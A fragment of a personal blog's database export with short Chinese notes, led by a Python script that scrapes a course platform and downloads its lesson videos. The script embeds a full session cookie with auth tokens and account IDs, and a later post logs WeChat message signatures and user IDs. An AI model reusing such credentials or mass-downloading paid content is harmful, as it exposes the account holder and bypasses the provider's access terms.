_umdata=C234BF9D3AFA6FE71EA6E4CE48D9BD53DB0208CB20D959012232396F043CC94EAD06E375B71FBF5DCD43AD3E795C914CAF4E29E6B21796B4E2F1E1803717844A; td_cookie=1583310513; _gid=GA1.2.25731033.1520306022; otherlogin=qq; uname=qq_9e3o2asf; uid=4627872; code=JYEUNA; authcode=135fwTzluWIwAbg4QQgj48oRfZkTbGiov3CgE5kvOkHaekzFmCYrdmcB8F3CED6V8GIp4eDkwxmpTKUyk9DsQBTJ1QvVOl8Xpwj5BXlhE81KtNQSlGsSOZYwc17WawQ; avatar=https%3A%2F%2Fassets.jikexueyuan.com%2Fuser%2Favtar%2Fdefault.gif; ca_status=1; vip_status=1; level_id=1; is_expire=0; domain=0iqWVUPUV; svip_status=0; svip_is_expire=1; QINGCLOUDELB=84b10773c6746376c2c7ad1fac354ddfd562b81daa2a899c46d3a1e304c7eb2b|Wp5di|Wp5di; gr_session_id_aacd01fff9535e79=73501102-bee7-4b50-a563-9f0cd3bd3a29; gr_cs1_73501102-bee7-4b50-a563-9f0cd3bd3a29=uid%3A4627872&apos;\n</code></pre><p>}</p>\n<p>referParam = {‘course_id’: ‘1888’}</p>\n<p>bigdata = ‘<a href=\"http://ke.jikexueyuan.com/zhiye/bigdata/&#39;\" target=\"_blank\" rel=\"noopener\">http://ke.jikexueyuan.com/zhiye/bigdata/&#39;</a><br>html = requests.get(bigdata,headers=header)<br>chapterRule = ‘<a jktag=\".*\" target=\"_blank\" href=\"(.*?)\" title=\".*\" class=\"inner\">‘<br>chapterUrl = re.findall(re.compile(chapterRule),html.text)<br>i=0</a></p>\n<p>for chapter in chapterUrl:<br>    html = requests.get(‘http:’+chapter,headers=header)</p>\n<pre><code>#referData = requests.get(&apos;http://www.jikexueyuan.com/course/1888.html&apos;,headers=header,params=referParam)\n#print(referData.text)\n#print(html.text)\n\nchapterTitleRule = &apos;&lt;a class=&quot;active&quot; href=&quot;javascript:;&quot;&gt;(.*?)&lt;/a&gt;&apos;\nchapterTile = re.findall(re.compile(chapterTitleRule,re.S),str(html.content,&apos;utf-8&apos;))[0]\ndir = str(i)+chapterTile\nos.mkdir( dir, 7777 )\ni = i+1\n\ncontentsRule = &apos;&lt;span class=&quot;sm-icon &quot;&gt;&lt;/span&gt;\\n\\s*&lt;a href=&quot;\\/\\/(.*?)&quot; jktag=&quot;.*&quot;&gt;.*?&lt;\\/a&gt;&apos;\ncontentsPattern = re.compile(contentsRule)\ncontentsUrls = re.findall(contentsPattern,html.text)\nprint(contentsUrls)\nfor courseUrl in contentsUrls:\n    courseHtml = requests.get(&apos;http://&apos;+courseUrl,headers=header)\n\n    vedioRule = &apos;&lt;source src=&quot;(.*?)&quot;.* type=&quot;video/mp4&quot;&apos;\n    titleRule = &apos;&lt;span class=&quot;tit&quot;&gt;(.*?)&lt;/span&gt;&apos;\n\n    vedioPattern = re.compile(vedioRule,re.S)\n    titlePattern = re.compile(titleRule,re.S)\n\n    vedioUrl = re.findall(vedioPattern,courseHtml.text)[0]\n    title = re.findall(titlePattern,str(courseHtml.content,&apos;utf-8&apos;))[0]\n\n    vedioUrl = vedioUrl.replace(&apos;amp;&apos;,&apos;&apos;)\n\n    print(vedioUrl)\n    print(title)\n\n    vedio = requests.get(url=vedioUrl)\n    with open(dir+&apos;/&apos;+title+&apos;.mp4&apos;, &apos;wb&apos;) as f:\n        f.write(vedio.content)\n        f.flush()\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p><code>`</code></p>\n<h1 id=\"coding-utf-8\"><a href=\"#coding-utf-8\" class=\"headerlink\" title=\"-- coding:utf-8 --\"></a>-<em>- coding:utf-8 -</em>-</h1><p>import requests<br>import re<br>import os</p>\n<p>header = {<br>    ‘User-Agent’: ‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0’,<br>    ‘Accept’: ‘text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8’,<br>    ‘Accept-Language’: ‘zh-CN,zh;q=0.9,en;q=0.8’,<br>    ‘Accept-Encoding’: ‘gzip, deflate’,</p>\n<pre><code>#&apos;Referer&apos;:&apos;http://www.jikexueyuan.com/course/1888.html?ss=1&apos;,\n&apos;Cookie&apos;:&apos;td_cookie=1156121737; _ga=GA1.2.380983170.1517797102; jkxyid_v2=574de074-6b6b-4475-a7f2-f01a14c4dd21; gr_user_id=93987888-4f04-4dc8-a2d8-b01212db5f21; _uab_collina=151779718059576220008262; MEIQIA_EXTRA_TRACK_ID=0vxp6LiOs5F6RZmZFpn0fdzGX1W; _umdata=C234BF9D3AFA6FE71EA6E4CE48D9BD53DB0208CB20D959012232396F043CC94EAD06E375B71FBF5DCD43AD3E795C914CAF4E29E6B21796B4E2F1E1803717844A; td_cookie=1583310513; _gid=GA1.2.25731033.1520306022; otherlogin=qq; uname=qq_9e3o2asf; uid=4627872; code=JYEUNA; authcode=135fwTzluWIwAbg4QQgj48oRfZkTbGiov3CgE5kvOkHaekzFmCYrdmcB8F3CED6V8GIp4eDkwxmpTKUyk9DsQBTJ1QvVOl8Xpwj5BXlhE81KtNQSlGsSOZYwc17WawQ; avatar=https%3A%2F%2Fassets.jikexueyuan.com%2Fuser%2Favtar%2Fdefault.gif; ca_status=1; vip_status=1; level_id=1; is_expire=0; domain=0iqWVUPUV; svip_status=0; svip_is_expire=1; QINGCLOUDELB=84b10773c6746376c2c7ad1fac354ddfd562b81daa2a899c46d3a1e304c7eb2b|Wp5di|Wp5di; gr_session_id_aacd01fff9535e79=73501102-bee7-4b50-a563-9f0cd3bd3a29; gr_cs1_73501102-bee7-4b50-a563-9f0cd3bd3a29=uid%3A4627872&apos;\n</code></pre><p>}</p>\n<p>referParam = {‘course_id’: ‘1888’}</p>\n<p>bigdata = ‘<a href=\"http://ke.jikexueyuan.com/zhiye/bigdata/&#39;\" target=\"_blank\" rel=\"noopener\">http://ke.jikexueyuan.com/zhiye/bigdata/&#39;</a><br>html = requests.get(bigdata,headers=header)<br>chapterRule = ‘<a jktag=\".*\" target=\"_blank\" href=\"(.*?)\" title=\".*\" class=\"inner\">‘<br>chapterUrl = re.findall(re.compile(chapterRule),html.text)<br>i=0</a></p>\n<p>for chapter in chapterUrl:<br>    html = requests.get(‘http:’+chapter,headers=header)</p>\n<pre><code>#referData = requests.get(&apos;http://www.jikexueyuan.com/course/1888.html&apos;,headers=header,params=referParam)\n#print(referData.text)\n#print(html.text)\n\nchapterTitleRule = &apos;&lt;a class=&quot;active&quot; href=&quot;javascript:;&quot;&gt;(.*?)&lt;/a&gt;&apos;\nchapterTile = re.findall(re.compile(chapterTitleRule,re.S),str(html.content,&apos;utf-8&apos;))[0]\ndir = str(i)+chapterTile\nos.mkdir( dir, 7777 )\ni = i+1\n\ncontentsRule = &apos;&lt;span class=&quot;sm-icon &quot;&gt;&lt;/span&gt;\\n\\s*&lt;a href=&quot;\\/\\/(.*?)&quot; jktag=&quot;.*&quot;&gt;.*?&lt;\\/a&gt;&apos;\ncontentsPattern = re.compile(contentsRule)\ncontentsUrls = re.findall(contentsPattern,html.text)\nprint(contentsUrls)\nfor courseUrl in contentsUrls:\n    courseHtml = requests.get(&apos;http://&apos;+courseUrl,headers=header)\n\n    vedioRule = &apos;&lt;source src=&quot;(.*?)&quot;.* type=&quot;video/mp4&quot;&apos;\n    titleRule = &apos;&lt;span class=&quot;tit&quot;&gt;(.*?)&lt;/span&gt;&apos;\n\n    vedioPattern = re.compile(vedioRule,re.S)\n    titlePattern = re.compile(titleRule,re.S)\n\n    vedioUrl = re.findall(vedioPattern,courseHtml.text)[0]\n    title = re.findall(titlePattern,str(courseHtml.content,&apos;utf-8&apos;))[0]\n\n    vedioUrl = vedioUrl.replace(&apos;amp;&apos;,&apos;&apos;)\n\n    print(vedioUrl)\n    print(title)\n\n    vedio = requests.get(url=vedioUrl)\n    with open(dir+&apos;/&apos;+title+&apos;.mp4&apos;, &apos;wb&apos;) as f:\n        f.write(vedio.content)\n        f.flush()\n</code></pre>"},{"title":"some thoughts","date":"2018-06-18T08:04:15.000Z","_content":"- 静态常量的使用很有必要，可以减少改动量\n- ","source":"_posts/some thoughts.md","raw":"---\ntitle: some thoughts\ndate: 2018-06-18 16:04:15\ntags: note\n---\n- 静态常量的使用很有必要，可以减少改动量\n- ","slug":"some thoughts","published":1,"updated":"2018-07-10T13:10:09.847Z","_id":"cjjedmh7a000d0gtjp9rwjp5l","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li>静态常量的使用很有必要，可以减少改动量</li>\n<li></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>静态常量的使用很有必要，可以减少改动量</li>\n<li></li>\n</ul>\n"},{"title":"tag todo","date":"2018-06-18T08:04:15.000Z","_content":"#### - gc\n#### - Python 全局变量\n#### - python错误：unexpected unident","source":"_posts/tag todo.md","raw":"---\ntitle: tag todo\ndate: 2018-06-18 16:04:15\ntags: note\n---\n#### - gc\n#### - Python 全局变量\n#### - python错误：unexpected unident","slug":"tag todo","published":1,"updated":"2018-07-10T13:10:09.848Z","_id":"cjjedmh7b000f0gtjszcoaxif","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"gc\"><a href=\"#gc\" class=\"headerlink\" title=\"- gc\"></a>- gc</h4><h4 id=\"Python-全局变量\"><a href=\"#Python-全局变量\" class=\"headerlink\" title=\"- Python 全局变量\"></a>- Python 全局变量</h4><h4 id=\"python错误：unexpected-unident\"><a href=\"#python错误：unexpected-unident\" class=\"headerlink\" title=\"- python错误：unexpected unident\"></a>- python错误：unexpected unident</h4>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"gc\"><a href=\"#gc\" class=\"headerlink\" title=\"- gc\"></a>- gc</h4><h4 id=\"Python-全局变量\"><a href=\"#Python-全局变量\" class=\"headerlink\" title=\"- Python 全局变量\"></a>- Python 全局变量</h4><h4 id=\"python错误：unexpected-unident\"><a href=\"#python错误：unexpected-unident\" class=\"headerlink\" title=\"- python错误：unexpected unident\"></a>- python错误：unexpected unident</h4>"},{"title":"tomcat配置首页和修改端口","date":"2018-06-18T08:04:15.000Z","_content":"#### 修改端口\nsever.xml   \n修改Connector port=\"端口号\" \n```\n<Connector port=\"80\" \nprotocol=\"HTTP/1.1\"\nconnectionTimeout=\"20000\"\nredirectPort=\"8443\" />\n```\n#### 修改首页\nserver.xml  \n*<host></host>* 中间加入一行   \n*<Context path=\"\" docBase= ==\"hello\"== debug=\"0\" reloadable=\"true\" />*     \nhello是要配置的新首页目录\n\n```\n<Host name=\"localhost\"  appBase=\"webapps\"\n            unpackWARs=\"true\" autoDeploy=\"true\">\n            \n\t\t<Context path=\"\" docBase=\"hello\" debug=\"0\" reloadable=\"true\" />\n\n        <Valve className=\"org.apache.catalina.valves.AccessLogValve\" \n        directory=\"logs\"\n               prefix=\"localhost_access_log\" suffix=\".txt\"\n               pattern=\"%h %l %u %t &quot;%r&quot; %s %b\" />\n\n      </Host>\n```","source":"_posts/tomcat配置首页和修改端口.md","raw":"---\ntitle: tomcat配置首页和修改端口\ndate: 2018-06-18 16:04:15\ntags: note\n---\n#### 修改端口\nsever.xml   \n修改Connector port=\"端口号\" \n```\n<Connector port=\"80\" \nprotocol=\"HTTP/1.1\"\nconnectionTimeout=\"20000\"\nredirectPort=\"8443\" />\n```\n#### 修改首页\nserver.xml  \n*<host></host>* 中间加入一行   \n*<Context path=\"\" docBase= ==\"hello\"== debug=\"0\" reloadable=\"true\" />*     \nhello是要配置的新首页目录\n\n```\n<Host name=\"localhost\"  appBase=\"webapps\"\n            unpackWARs=\"true\" autoDeploy=\"true\">\n            \n\t\t<Context path=\"\" docBase=\"hello\" debug=\"0\" reloadable=\"true\" />\n\n        <Valve className=\"org.apache.catalina.valves.AccessLogValve\" \n        directory=\"logs\"\n               prefix=\"localhost_access_log\" suffix=\".txt\"\n               pattern=\"%h %l %u %t &quot;%r&quot; %s %b\" />\n\n      </Host>\n```","slug":"tomcat配置首页和修改端口","published":1,"updated":"2018-07-10T13:10:09.850Z","_id":"cjjedmh7c000h0gtjyqfyojo3","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"修改端口\"><a href=\"#修改端口\" class=\"headerlink\" title=\"修改端口\"></a>修改端口</h4><p>sever.xml<br>修改Connector port=”端口号”<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Connector port=&quot;80&quot; </span><br><span class=\"line\">protocol=&quot;HTTP/1.1&quot;</span><br><span class=\"line\">connectionTimeout=&quot;20000&quot;</span><br><span class=\"line\">redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"修改首页\"><a href=\"#修改首页\" class=\"headerlink\" title=\"修改首页\"></a>修改首页</h4><p>server.xml<br><em><host></host></em> 中间加入一行<br><em>&lt;Context path=”” docBase= ==”hello”== debug=”0” reloadable=”true” /&gt;</em><br>hello是要配置的新首页目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Host name=&quot;localhost&quot;  appBase=&quot;webapps&quot;</span><br><span class=\"line\">            unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class=\"line\">            </span><br><span class=\"line\">\t\t&lt;Context path=&quot;&quot; docBase=&quot;hello&quot; debug=&quot;0&quot; reloadable=&quot;true&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; </span><br><span class=\"line\">        directory=&quot;logs&quot;</span><br><span class=\"line\">               prefix=&quot;localhost_access_log&quot; suffix=&quot;.txt&quot;</span><br><span class=\"line\">               pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">      &lt;/Host&gt;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"修改端口\"><a href=\"#修改端口\" class=\"headerlink\" title=\"修改端口\"></a>修改端口</h4><p>sever.xml<br>修改Connector port=”端口号”<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Connector port=&quot;80&quot; </span><br><span class=\"line\">protocol=&quot;HTTP/1.1&quot;</span><br><span class=\"line\">connectionTimeout=&quot;20000&quot;</span><br><span class=\"line\">redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"修改首页\"><a href=\"#修改首页\" class=\"headerlink\" title=\"修改首页\"></a>修改首页</h4><p>server.xml<br><em><host></host></em> 中间加入一行<br><em>&lt;Context path=”” docBase= ==”hello”== debug=”0” reloadable=”true” /&gt;</em><br>hello是要配置的新首页目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Host name=&quot;localhost&quot;  appBase=&quot;webapps&quot;</span><br><span class=\"line\">            unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class=\"line\">            </span><br><span class=\"line\">\t\t&lt;Context path=&quot;&quot; docBase=&quot;hello&quot; debug=&quot;0&quot; reloadable=&quot;true&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; </span><br><span class=\"line\">        directory=&quot;logs&quot;</span><br><span class=\"line\">               prefix=&quot;localhost_access_log&quot; suffix=&quot;.txt&quot;</span><br><span class=\"line\">               pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">      &lt;/Host&gt;</span><br></pre></td></tr></table></figure>"},{"title":"useful articles","date":"2018-06-18T08:04:15.000Z","_content":"- #### [What Programming Languages Are Used Late at Night?](https://stackoverflow.blog/2017/04/19/programming-languages-used-late-night/)\n\nI enjoy programming as a hobby and I’m a bit of a night owl, so I often code well outside working hours, sometimes past midnight. And whatever time it is, when I run into a bug I visit Stack Overflow.\n\nThis means that Stack Overflow data can give us insights into what kinds of developers program in the evening or night, and conversely what programming languages are used only during the workday. In this post, we’ll examine what tags are visited at what times a day, and also compare major cities to see how their working hours differ.\n\n- #### [Why Stack Overflow Doesn’t Care About Ad Blockers](https://stackoverflow.blog/2016/10/26/why-stack-overflow-doesnt-care-about-ad-blockers/)\nHi! I’m Steve Feldman, Senior Ad Ops Manager at Stack Overflow. My whole life I’ve been fascinated by advertising. Even as a kid, I wondered what a company was trying to tell me by using one word instead of another in an ad. Over time, I developed a strong (read: subjective) opinion of what makes an ad ’good,’ and what makes an ad ’bad.’ It took me many years– in fact, it wasn’t until joining the Ad Sales team at Stack Overflow– to finally figure out that the common thread shared by the best ads is relevance. Maintaining that relevance is how we’ve managed to avoid one of the biggest issues facing publishers today: ad blocking.\n\n- ####  [Text Mining with R](http://tidytextmining.com/preface.html)\n> book\n\nIf you work in analytics or data science, like we do, you are familiar with the fact that data is being generated all the time at ever faster rates. (You may even be a little weary of people pontificating about this fact.) Analysts are often trained to handle tabular or rectangular data that is mostly numeric, but much of the data proliferating today is unstructured and text-heavy. Many of us who work in analytical fields are not trained in even simple interpretation of natural language.","source":"_posts/useful articles.md","raw":"---\ntitle: useful articles\ndate: 2018-06-18 16:04:15\ntags: note\n---\n- #### [What Programming Languages Are Used Late at Night?](https://stackoverflow.blog/2017/04/19/programming-languages-used-late-night/)\n\nI enjoy programming as a hobby and I’m a bit of a night owl, so I often code well outside working hours, sometimes past midnight. And whatever time it is, when I run into a bug I visit Stack Overflow.\n\nThis means that Stack Overflow data can give us insights into what kinds of developers program in the evening or night, and conversely what programming languages are used only during the workday. In this post, we’ll examine what tags are visited at what times a day, and also compare major cities to see how their working hours differ.\n\n- #### [Why Stack Overflow Doesn’t Care About Ad Blockers](https://stackoverflow.blog/2016/10/26/why-stack-overflow-doesnt-care-about-ad-blockers/)\nHi! I’m Steve Feldman, Senior Ad Ops Manager at Stack Overflow. My whole life I’ve been fascinated by advertising. Even as a kid, I wondered what a company was trying to tell me by using one word instead of another in an ad. Over time, I developed a strong (read: subjective) opinion of what makes an ad ’good,’ and what makes an ad ’bad.’ It took me many years– in fact, it wasn’t until joining the Ad Sales team at Stack Overflow– to finally figure out that the common thread shared by the best ads is relevance. Maintaining that relevance is how we’ve managed to avoid one of the biggest issues facing publishers today: ad blocking.\n\n- ####  [Text Mining with R](http://tidytextmining.com/preface.html)\n> book\n\nIf you work in analytics or data science, like we do, you are familiar with the fact that data is being generated all the time at ever faster rates. (You may even be a little weary of people pontificating about this fact.) Analysts are often trained to handle tabular or rectangular data that is mostly numeric, but much of the data proliferating today is unstructured and text-heavy. Many of us who work in analytical fields are not trained in even simple interpretation of natural language.","slug":"useful articles","published":1,"updated":"2018-07-10T13:10:09.853Z","_id":"cjjedmh7d000j0gtjtvgg0v0p","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"What-Programming-Languages-Are-Used-Late-at-Night\"><a href=\"#What-Programming-Languages-Are-Used-Late-at-Night\" class=\"headerlink\" title=\"What Programming Languages Are Used Late at Night?\"></a><a href=\"https://stackoverflow.blog/2017/04/19/programming-languages-used-late-night/\" target=\"_blank\" rel=\"noopener\">What Programming Languages Are Used Late at Night?</a></h4></li>\n</ul>\n<p>I enjoy programming as a hobby and I’m a bit of a night owl, so I often code well outside working hours, sometimes past midnight. And whatever time it is, when I run into a bug I visit Stack Overflow.</p>\n<p>This means that Stack Overflow data can give us insights into what kinds of developers program in the evening or night, and conversely what programming languages are used only during the workday. In this post, we’ll examine what tags are visited at what times a day, and also compare major cities to see how their working hours differ.</p>\n<ul>\n<li><h4 id=\"Why-Stack-Overflow-Doesn’t-Care-About-Ad-Blockers\"><a href=\"#Why-Stack-Overflow-Doesn’t-Care-About-Ad-Blockers\" class=\"headerlink\" title=\"Why Stack Overflow Doesn’t Care About Ad Blockers\"></a><a href=\"https://stackoverflow.blog/2016/10/26/why-stack-overflow-doesnt-care-about-ad-blockers/\" target=\"_blank\" rel=\"noopener\">Why Stack Overflow Doesn’t Care About Ad Blockers</a></h4><p>Hi! I’m Steve Feldman, Senior Ad Ops Manager at Stack Overflow. My whole life I’ve been fascinated by advertising. Even as a kid, I wondered what a company was trying to tell me by using one word instead of another in an ad. Over time, I developed a strong (read: subjective) opinion of what makes an ad ’good,’ and what makes an ad ’bad.’ It took me many years– in fact, it wasn’t until joining the Ad Sales team at Stack Overflow– to finally figure out that the common thread shared by the best ads is relevance. Maintaining that relevance is how we’ve managed to avoid one of the biggest issues facing publishers today: ad blocking.</p>\n</li>\n<li><h4 id=\"Text-Mining-with-R\"><a href=\"#Text-Mining-with-R\" class=\"headerlink\" title=\"Text Mining with R\"></a><a href=\"http://tidytextmining.com/preface.html\" target=\"_blank\" rel=\"noopener\">Text Mining with R</a></h4><blockquote>\n<p>book</p>\n</blockquote>\n</li>\n</ul>\n<p>If you work in analytics or data science, like we do, you are familiar with the fact that data is being generated all the time at ever faster rates. (You may even be a little weary of people pontificating about this fact.) Analysts are often trained to handle tabular or rectangular data that is mostly numeric, but much of the data proliferating today is unstructured and text-heavy. Many of us who work in analytical fields are not trained in even simple interpretation of natural language.</p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"What-Programming-Languages-Are-Used-Late-at-Night\"><a href=\"#What-Programming-Languages-Are-Used-Late-at-Night\" class=\"headerlink\" title=\"What Programming Languages Are Used Late at Night?\"></a><a href=\"https://stackoverflow.blog/2017/04/19/programming-languages-used-late-night/\" target=\"_blank\" rel=\"noopener\">What Programming Languages Are Used Late at Night?</a></h4></li>\n</ul>\n<p>I enjoy programming as a hobby and I’m a bit of a night owl, so I often code well outside working hours, sometimes past midnight. And whatever time it is, when I run into a bug I visit Stack Overflow.</p>\n<p>This means that Stack Overflow data can give us insights into what kinds of developers program in the evening or night, and conversely what programming languages are used only during the workday. In this post, we’ll examine what tags are visited at what times a day, and also compare major cities to see how their working hours differ.</p>\n<ul>\n<li><h4 id=\"Why-Stack-Overflow-Doesn’t-Care-About-Ad-Blockers\"><a href=\"#Why-Stack-Overflow-Doesn’t-Care-About-Ad-Blockers\" class=\"headerlink\" title=\"Why Stack Overflow Doesn’t Care About Ad Blockers\"></a><a href=\"https://stackoverflow.blog/2016/10/26/why-stack-overflow-doesnt-care-about-ad-blockers/\" target=\"_blank\" rel=\"noopener\">Why Stack Overflow Doesn’t Care About Ad Blockers</a></h4><p>Hi! I’m Steve Feldman, Senior Ad Ops Manager at Stack Overflow. My whole life I’ve been fascinated by advertising. Even as a kid, I wondered what a company was trying to tell me by using one word instead of another in an ad. Over time, I developed a strong (read: subjective) opinion of what makes an ad ’good,’ and what makes an ad ’bad.’ It took me many years– in fact, it wasn’t until joining the Ad Sales team at Stack Overflow– to finally figure out that the common thread shared by the best ads is relevance. Maintaining that relevance is how we’ve managed to avoid one of the biggest issues facing publishers today: ad blocking.</p>\n</li>\n<li><h4 id=\"Text-Mining-with-R\"><a href=\"#Text-Mining-with-R\" class=\"headerlink\" title=\"Text Mining with R\"></a><a href=\"http://tidytextmining.com/preface.html\" target=\"_blank\" rel=\"noopener\">Text Mining with R</a></h4><blockquote>\n<p>book</p>\n</blockquote>\n</li>\n</ul>\n<p>If you work in analytics or data science, like we do, you are familiar with the fact that data is being generated all the time at ever faster rates. (You may even be a little weary of people pontificating about this fact.) Analysts are often trained to handle tabular or rectangular data that is mostly numeric, but much of the data proliferating today is unstructured and text-heavy. Many of us who work in analytical fields are not trained in even simple interpretation of natural language.</p>\n"},{"title":"wx","date":"2018-06-18T08:04:15.000Z","_content":"\r\n```\r\n[\r\nsignature=[28e4c70d40d8fef5c003aafcbbb3171a64561819],\r\nencType=[null], msgSignature=[null],\r\ntimestamp=[1497433329], nonce=[20007573], \r\nrequestBody=[\r\n<xml><ToUserName><![CDATA[gh_3de6e35b335b]]></ToUserName>\r\n<FromUserName><![CDATA[oBhLWvjV7OGQ8SJG4VSXs2oC1dko]]></FromUserName>\r\n<CreateTime>1497433329</CreateTime>\r\n<MsgType><![CDATA[text]]></MsgType>\r\n<Content><![CDATA[？？？？]]></Content>\r\n<MsgId>6431427176431094735</MsgId>\r\n</xml>\r\n] \r\n```","source":"_posts/wx.md","raw":"---\ntitle: wx\ndate: 2018-06-18 16:04:15\ntags: note\n---\n\r\n```\r\n[\r\nsignature=[28e4c70d40d8fef5c003aafcbbb3171a64561819],\r\nencType=[null], msgSignature=[null],\r\ntimestamp=[1497433329], nonce=[20007573], \r\nrequestBody=[\r\n<xml><ToUserName><![CDATA[gh_3de6e35b335b]]></ToUserName>\r\n<FromUserName><![CDATA[oBhLWvjV7OGQ8SJG4VSXs2oC1dko]]></FromUserName>\r\n<CreateTime>1497433329</CreateTime>\r\n<MsgType><![CDATA[text]]></MsgType>\r\n<Content><![CDATA[？？？？]]></Content>\r\n<MsgId>6431427176431094735</MsgId>\r\n</xml>\r\n] \r\n```","slug":"wx","published":1,"updated":"2018-07-10T13:10:09.854Z","_id":"cjjedmh7e000l0gtjcg6c5ta9","comments":1,"layout":"post","photos":[],"link":"","content":"<pre><code>[\nsignature=[28e4c70d40d8fef5c003aafcbbb3171a64561819],\nencType=[null], msgSignature=[null],\ntimestamp=[1497433329], nonce=[20007573], \nrequestBody=[\n&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[gh_3de6e35b335b]]&gt;&lt;/ToUserName&gt;\n&lt;FromUserName&gt;&lt;![CDATA[oBhLWvjV7OGQ8SJG4VSXs2oC1dko]]&gt;&lt;/FromUserName&gt;\n&lt;CreateTime&gt;1497433329&lt;/CreateTime&gt;\n&lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt;\n&lt;Content&gt;&lt;![CDATA[？？？？]]&gt;&lt;/Content&gt;\n&lt;MsgId&gt;6431427176431094735&lt;/MsgId&gt;\n&lt;/xml&gt;\n] \n</code></pre>","site":{"data":{}},"excerpt":"","more":"<pre><code>[\nsignature=[28e4c70d40d8fef5c003aafcbbb3171a64561819],\nencType=[null], msgSignature=[null],\ntimestamp=[1497433329], nonce=[20007573], \nrequestBody=[\n&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[gh_3de6e35b335b]]&gt;&lt;/ToUserName&gt;\n&lt;FromUserName&gt;&lt;![CDATA[oBhLWvjV7OGQ8SJG4VSXs2oC1dko]]&gt;&lt;/FromUserName&gt;\n&lt;CreateTime&gt;1497433329&lt;/CreateTime&gt;\n&lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt;\n&lt;Content&gt;&lt;![CDATA[？？？？]]&gt;&lt;/Content&gt;\n&lt;MsgId&gt;6431427176431094735&lt;/MsgId&gt;\n&lt;/xml&gt;\n] \n</code></pre>"},{"title":"乱七八糟","date":"2018-06-18T08:04:15.000Z","_content":"1.windows远程输入命令\n```\nMSTSC\n```","source":"_posts/乱七八糟.md","raw":"---\ntitle: 乱七八糟\ndate: 2018-06-18 16:04:15\ntags: note\n---\n1.windows远程输入命令\n```\nMSTSC\n```","slug":"乱七八糟","published":1,"updated":"2018-07-10T13:10:09.856Z","_id":"cjjedmh7k000r0gtj37lcpy9h","comments":1,"layout":"post","photos":[],"link":"","content":"<p>1.windows远程输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MSTSC</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>1.windows远程输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MSTSC</span><br></pre></td></tr></table></figure></p>\n"},{"title":"无标题Markdown","date":"2018-06-18T08:04:15.000Z","_content":"http://blog.csdn.net/nvzizhou/article/details/40342353","source":"_posts/无标题Markdown.md","raw":"---\ntitle: 无标题Markdown\ndate: 2018-06-18 16:04:15\ntags: note\n---\nhttp://blog.csdn.net/nvzizhou/article/details/40342353","slug":"无标题Markdown","published":1,"updated":"2018-07-10T13:10:09.857Z","_id":"cjjedmh7l000s0gtjaanzxr53","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://blog.csdn.net/nvzizhou/article/details/40342353\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/nvzizhou/article/details/40342353</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://blog.csdn.net/nvzizhou/article/details/40342353\" target=\"_blank\" 